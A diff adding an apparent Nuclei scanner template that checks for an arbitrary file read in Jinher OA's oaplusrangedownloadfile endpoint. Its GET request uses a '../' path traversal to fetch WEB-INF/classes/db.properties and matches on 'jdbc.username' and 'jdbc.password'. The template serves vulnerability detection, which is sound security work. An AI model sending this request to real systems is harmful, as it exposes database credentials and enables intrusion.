@@ -1,0 +1,27 @@
+id: poc-jinher-oa-oaplusrangedownloadfile-fileread
+
+info:
+  name: Jinher OA oaplusrangedownloadfile Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/jc6/JHSoft.WCF/login/oaplusrangedownloadfile?filename=../WEB-INF/classes/db.properties"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "jdbc.username"
+          - "jdbc.password"
+          - "jdbc.drive"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
